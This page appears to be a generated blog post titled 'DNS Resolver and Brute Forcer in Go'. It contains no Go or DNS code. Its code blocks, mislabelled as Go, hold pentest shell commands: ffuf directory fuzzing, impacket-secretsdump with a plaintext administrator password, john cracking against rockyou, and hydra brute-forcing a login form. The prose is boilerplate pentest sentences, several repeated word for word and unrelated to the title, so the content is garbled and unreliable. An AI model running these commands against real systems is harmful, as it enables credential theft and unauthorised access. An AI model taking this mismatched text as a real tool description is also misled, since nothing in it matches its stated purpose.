---
TitleSEO: "DNS Resolver and Brute Forcer in Go | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Go"
Author: "ZureFX"
Description: "A Go script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "python, parser, bash, go"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-508.html"
URL_IMAGES: ""
Date: "2024-08-04"
Tags: "Python, Parser, Bash, Go"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-508"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-508.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Go** for offensive security automation.

### Requirements

- Go
- `impacket`
- `GetNPUsers`
- `chisel`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

```go
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.56.181.73/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.46.25.11/FUZZ
```

Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials.

### Helper Functions

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

```go
impacket-secretsdump administrator:'P@ssw0rd!'@10.106.86.169
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.31.27.28 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.84.192.205 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

The target system was identified as running a vulnerable version of the service. The scheduled task ran with elevated privileges and could be abused for escalation.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 28.43s
```
